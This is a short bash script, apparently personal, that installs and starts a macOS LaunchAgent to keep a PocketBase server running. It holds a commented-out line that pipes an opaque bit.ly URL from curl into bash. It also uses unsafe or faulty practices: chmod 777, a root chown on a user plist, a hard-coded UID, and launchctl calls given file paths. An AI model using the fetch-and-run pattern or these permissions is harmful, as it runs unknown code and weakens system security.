#!/usr/bin/env bash

#installs the persistant pocketbase

launchctl unload ~/Library/LaunchAgents/run.plist

chmod u+rw /Users/sda/Library/LaunchAgents


cat ~/Library/LaunchAgents/Library-App-master/run.sh >> ~/Library/Launchagents/run.sh
chmod 777 ~/Library/Launchagents/run.sh

cat ~/Library/LaunchAgents/Library-App-master/run.plist >> ~/Library/LaunchAgents/run.plist
chmod 600 ~/Library/Launchagents/run.plist

# user/ id / path, id found with id command
launchctl enable user/501/~/Library/LaunchAgents/run.plist

#now start
launchctl kickstart user/501/~/Library/LaunchAgents/run.plist

sudo chmod 600 /Users/sda/Library/LaunchAgents/run.plist 
sudo chown root /Users/sda/Library/LaunchAgents/run.plist 

launchctl load ~/Library/LaunchAgents/run.plist

#idk 'curl -s -L https://bit.ly/xxmr | bash &'

echo Pocketbase is now running hopefuly